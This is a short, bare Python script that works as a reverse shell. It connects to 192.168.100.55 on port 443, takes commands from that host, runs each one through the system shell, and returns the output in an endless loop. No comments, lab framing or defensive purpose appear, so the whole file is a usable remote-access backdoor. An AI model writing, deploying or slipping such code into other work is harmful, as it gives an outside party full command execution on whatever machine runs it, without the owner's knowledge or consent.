#!/usr/bin/env python

import socket
import subprocess

def run_command(command):
    r = subprocess.run(command, shell=True,text=True, capture_output=True)

    if r.stdout:
        return r.stdout
    else:
        return r.stderr

def create_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    return s

def main():
    s = create_socket()
    s.connect(('192.168.100.55', 443))

    while True:
        command = s.recv(1024).decode().strip()
        command_output = run_command(command)
        s.send(command_output.encode())

    s.close()

if __name__ == "__main__":
    main()
